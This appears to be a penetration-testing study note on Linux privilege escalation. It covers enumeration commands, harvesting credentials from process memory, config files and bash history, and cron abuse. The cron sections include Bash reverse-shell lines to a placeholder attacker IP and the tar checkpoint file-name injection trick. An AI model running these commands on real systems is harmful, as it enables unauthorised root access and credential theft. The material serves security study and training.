# Linux

## Linux enumeration

#### System enumeration

```bash
cat /etc/*-release #Enumerate the operative system's information
lsb_release -a #Linux Standard Base (LSB) information
hostnamectl #Hostame systemd utility
uname -a #Kernel version and operative system architecture
ps aux | grep root #Processes running as root
#We need to list the software installed on /usr/local, /user/local/bin/, /opt/, /var, /usr/arc
dpkg -l #List the installed packages on Debian
rpm -qa #List the installed software RHEL or Fedora
```

#### User and group enumeration

```bash
whoami #Determine the current user
cat /etc/passwd #Enumerate other user accounts
groups <username> #Enumerate the groups our account is part of
cat /etc/group #List the groups on the system
find / -perm -u=s -type f 2>/dev/null #Search for SUID binaries 
```

#### Network enumeration

```bash
ifconfig #Enumerate target network interfaces and their details
route #Routing table
netstat -ant #Active connections and ports
```

#### Automated enumeration tools

#### LinPEAS

[https://github.com/carlospolop/\
privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

#### Linux exploit suggester

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

## Linux Kernel Exploits

#### Local enumeration tools

* LinPEAS

#### Enumerating system information

* Using Linpeas, we can enumerate only system information: `./linpeas.sh -o SysI`
* Using the **Linux exploit suggester** tool
* Using searchsploit after knowing the kernel version

## Linux Password Mining

#### Extracting passwords from memory

1. `ps -ef` or `ps -ef | grep <SERVICE_NAME>`  &#x20;
2. We can utilize GDB to dump the memory of the Bash service in order to reveal credentials that may have been entered in the Bash session earlier on by other users. `GDB -p <PID>`&#x20;
3. List all mapped memory reginos for the procces using the following command in GDB: `info proc mappings`&#x20;
4. Dump the memory of the service: `dump memory <OUTPUT_FILE> <START_ADDRESS> <STOP_ADDRESS>`&#x20;
5. After dumping the memory, we can utilize the strings utility to identify potential credentials: `strings /<OUTPUT_FILE> | grep passw`&#x20;

#### Searching for passwords in configuration files

* Perform a recursive scan from the root of the files system and output a list of files that contain the `password` keyword:&#x20;

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
#Use also passw or pass
#Limit the folder to '/etc' or '/home/<USER>' to decrease the amount of info
```

* Use `find` with `grep` to fine-tune the searches.

```bash
find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;
#This command will output a list of files in the /etc directory that contain the pass keyword.
```

#### Searching for passwords in history files

* Analyze the `user` account Bash history file

```bash
cat /home/wizard/.bash_history | grep "pass"
```

* Output the entire history of commands

```bash
cat /home/wizard/.bash_history | grep "pass"
```

## Scheduled Tasks

#### Enumerate cron paths

```bash
crontab
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

#### Escalating privileges via cron paths

This thechnique involves identifying the default `$PATH` variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

So we create the `overwrive.sh` script in the /home/user folder and insert a Bash reverse shell.

```bash
echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
```

#### Escalation via cron wildcards (\*)

Using the example above: `cat /usr/local/bin/compress.sh`&#x20;

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

tar utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.

```bash
echo 'bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1' > shell.sh
touch /home/user/--checkpoint=1 #Set up tar checkpoint
touch /home/user/--checkpoint-action=exec=sh\ shell.sh #Set the checkpoint action

```

#### Escalation via file overwrites

The success and viability of this technique will depend on whether we have the necessary permissions to write or make changes to the script or file being run by the cron job.

Using the first example, if script is not found in the first directory, cron will check the other directories specified in the $PATH variable

we can search for the script in the other directories specified in the $PATH variable. This can be done by listing the contents of each directory, as follows: `ls -al /usr/local/bin | grep overwrite.sh` or `locate overwrite.sh` . After, we identify the permissions and create a overwrite.sh with a reverse shell.

## Exploiting SUID Binaries

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

#### Changing permissions

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Examples:&#x20;

```bash
chmod +x script.sh #Executable permissions
chmod u+x script.sh #Executable permissins to all users
chmod g+x, a+w script.sh #Groups executable permissions and all users and groups write permissions
chmod a-x script.sh #Remove executable permissions from a file
```

#### Understanding SUID permissions
